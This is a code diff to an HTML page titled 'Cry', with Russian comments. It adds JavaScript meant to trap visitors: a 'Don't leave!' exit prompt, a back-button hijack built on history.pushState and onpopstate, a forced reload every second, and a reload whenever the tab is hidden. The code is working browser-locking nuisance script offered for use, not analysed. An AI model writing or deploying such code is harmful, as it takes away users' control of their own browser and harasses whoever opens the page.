@@ -2,15 +2,28 @@
   <head>
     <title>Cry</title>
     <script type="text/javascript">
-      // Бесконечный цикл для блокировки выхода
+      // Предупреждение при попытке покинуть страницу
       window.onbeforeunload = function () {
-        return "Don't leave!";
+        return "Don't leave! Your tears aren't done yet.";
       };
 
-      // Автоперенаправление на ту же страницу
-      setTimeout(function () {
-        location.href = window.location.href;
+      // Перенаправление назад, если пользователь попытается уйти
+      history.pushState(null, "", location.href);
+      window.onpopstate = function () {
+        history.pushState(null, "", location.href);
+      };
+
+      // Бесконечный таймер для обновления страницы
+      setInterval(function () {
+        location.href = location.href;
       }, 1000);
+
+      // Запрет на жесты назад (работает в большинстве мобильных браузеров)
+      document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+          location.href = location.href;
+        }
+      });
     </script>
   </head>
   <body style="background-color: black; color: red; text-align: center; margin-top: 20%;">
